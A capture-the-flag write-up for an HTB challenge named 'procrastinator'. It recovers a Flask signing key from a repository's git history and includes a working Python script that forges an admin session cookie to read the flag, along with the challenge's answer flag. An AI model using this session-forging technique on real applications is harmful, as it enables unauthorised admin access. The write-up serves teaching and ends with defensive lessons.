# procrastinator — crypto, easy — 1000 pts

**Flag:** `HTB{git_history_can_reveal_sensitive_cryptographic_components_a3992db4061f4cf171d93b69aeaa3443}`

A Flask app with a login page and an admin-only dashboard. The handout ships the application
source — *including a live `.git` directory*.

---

## Step 1 — read the source and find where the flag is served

`challenge/application/views.py`:

```python
@bp.route('/login', methods=['POST'])
def login():
    ...
    if username == 'admin':
        return jsonify({'error': 'You are not allowed to login as admin.'})
    session['user'] = username
    return jsonify({'message': f'Welcome, {username}!...'})

@bp.route('/dashboard', methods=['POST'])
def dashboard():
    user = session['user']
    if not user == 'admin':
        flash('Only admins can access the dashboard.', 'error')
        return redirect(url_for('views.home'))
    return jsonify({'secret': open('/flag.txt').read()})
```

Two observations:

1. `/login` refuses to set `session['user'] = 'admin'`.
2. `/dashboard` checks only `session['user'] == 'admin'`.

The guard is on the *write* path, but the *read* path trusts the session. A Flask session cookie is
signed, not encrypted — so if we learn the signing key, we forge the session directly and never
touch `/login` at all.

## Step 2 — find the signing key

`app.py` as shipped looks clean:

```python
app.secret_key = os.environ.get('SECRET_KEY', 'dev')
```

But the handout includes `.git`:

```console
$ git -C challenge/application log --oneline --all
2982215 critical change :: read secret key from environment
9e336de initial commit
```

The commit message is an advertisement. Read the parent blob:

```console
$ git -C challenge/application show 9e336de:app.py
...
    app.secret_key = 'cb3dc3100ef0a2ce0c60b7f832091f8e' # TODO : remove hardcoded key from git repo
```

The key was removed from the working tree but is still in object storage. This is the whole
challenge, and it is a real-world failure mode — rotating a secret requires *rotating the secret*,
not deleting the line that contains it.

### The decoy

`Dockerfile` contains:

```dockerfile
ENV SECRET_KEY=fake_key_for_testing
```

That is the sanitised value baked into the public handout. The deployed instance is started with the
real key — which is the one leaked in git history. Do not conclude from the Dockerfile that the
leaked key is dead.

## Step 3 — forge the session offline

Flask signs session cookies with `itsdangerous`, salt `cookie-session`, HMAC key derivation,
SHA-1 digest, and Flask's `TaggedJSONSerializer`:

```python
from itsdangerous.url_safe import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
import hashlib, requests

SECRET = 'cb3dc3100ef0a2ce0c60b7f832091f8e'

s = URLSafeTimedSerializer(
        SECRET,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1})

cookie = s.dumps({'user': 'admin'})

r = requests.post(f'http://{HOST}:{PORT}/dashboard', cookies={'session': cookie})
print(r.text)
```

```json
{"secret":"HTB{git_history_can_reveal_sensitive_cryptographic_components_a3992db4061f4cf171d93b69aeaa3443}"}
```

No registration, no login request, one HTTP call.

---

## Lessons

- **A leaked secret is leaked forever.** `git log -p --all`, `git show <old>:<file>`, and
  `git cat-file --batch-all-objects` are the first things to run whenever a handout ships `.git`.
  Unreachable objects count too — check `git fsck --lost-found`.
- **Authorisation checks belong on the read path.** Blocking `admin` at login while trusting
  `session['user']` at the dashboard is defence in exactly the wrong place.
- If you control a signing key, you control every value the application believes about the client.
